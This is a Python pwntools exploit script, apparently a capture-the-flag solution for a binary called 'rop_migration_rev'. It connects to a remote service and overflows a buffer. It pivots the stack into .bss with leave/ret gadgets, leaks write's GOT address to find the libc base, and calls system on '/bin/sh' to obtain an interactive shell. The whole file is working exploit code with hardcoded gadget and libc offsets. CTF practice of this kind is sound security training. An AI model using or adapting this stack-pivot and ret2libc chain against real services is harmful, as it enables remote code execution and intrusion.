from pwn import *
context.arch = 'amd64'

elf = ELF('../distribute/share/rop_migration_rev')
# p = elf.process()
p = remote('0.0.0.0', 30009)

bss = 0x0000000000404000 + 0x800 + 0x8
bss2 = bss + 0x400
pop_rdi = 0x00000000004012b3
pop_rsi_r15 = 0x00000000004012b1
leave_ret = 0x0000000000401242
read = 0x0000000000401227
write_read = 0x000000000040121d

p.recvline()
payload = b'a' * 0x20 + p64(bss + 0x20) + p64(read)
p.send(payload)

ropc = flat([bss2 + 0x20, pop_rsi_r15, elf.got['write'], 0, write_read])

p.send(ropc[0:0x20] + p64(bss2) + p64(read))
p.send(b'a' * 0x20 + p64(bss + 0x20 * 2) + p64(read))
p.send(ropc[0x20:len(ropc)].ljust(0x20, b'\x00') + p64(bss2) + p64(read))
p.send(b'a' * 0x20 + p64(bss) + p64(leave_ret))

write_addr = u64(p.recv(8))
libc_base = write_addr - 0x1111d0
info(f'libc_base: {hex(libc_base)}')

system = libc_base + 0x55410
sh = libc_base + 0x16261
ropc = flat([0, pop_rdi, sh, system])
p.send(ropc + p64(bss2) + p64(leave_ret))

p.interactive()
